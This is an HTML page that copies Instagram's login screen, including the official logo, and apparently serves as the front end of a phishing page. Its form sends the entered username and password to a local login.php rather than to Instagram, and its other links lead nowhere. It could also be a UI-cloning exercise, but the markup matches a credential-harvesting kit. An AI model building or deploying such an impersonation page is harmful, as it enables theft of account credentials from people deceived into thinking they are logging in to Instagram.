<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram</title>
  <link rel="stylesheet" href="style.css" />
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
</head>
<body>
  <div class="container">
    <div class="login-box">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" alt="Instagram" class="logo"/>

      <form action="login.php" method="POST">
        <input type="text" name="username" placeholder="Phone number, username, or email" />
        <input type="password" name="pass" placeholder="Password" />
        <button type="submit" name="login">Log In</button>
      </form>

      <div class="divider">
        <div class="line"></div>
        <div class="or">OR</div>
        <div class="line"></div>
      </div>

      <a href="#" class="fb-login">Log in with Facebook</a>
      <a href="#" class="forgot">Forgot password?</a>
    </div>

    <div class="signup-box">
      <p>Don't have an account? <a href="#">Sign up</a></p>
    </div>
  </div>
  
</body>
</html>
